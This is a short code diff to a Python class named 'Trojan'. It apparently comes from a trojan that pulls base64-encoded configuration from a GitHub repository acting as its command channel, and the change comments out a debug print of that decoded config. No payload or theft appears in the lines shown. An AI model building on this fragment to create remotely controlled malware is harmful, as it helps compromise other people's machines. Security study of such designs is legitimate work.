@@ -33,7 +33,7 @@ class Trojan:
         try:
             config_json = get_file_contents('config', self.config_file, self.repo)
             decoded_config = base64.b64decode(config_json).decode('utf-8')
-            print(f"Decoded config JSON: {decoded_config}")  # Debug output
+            # print(f"Decoded config JSON: {decoded_config}")  # Debug output
             return json.loads(decoded_config)
         except Exception as e:
             print(f"Error fetching GitHub config: {e}")
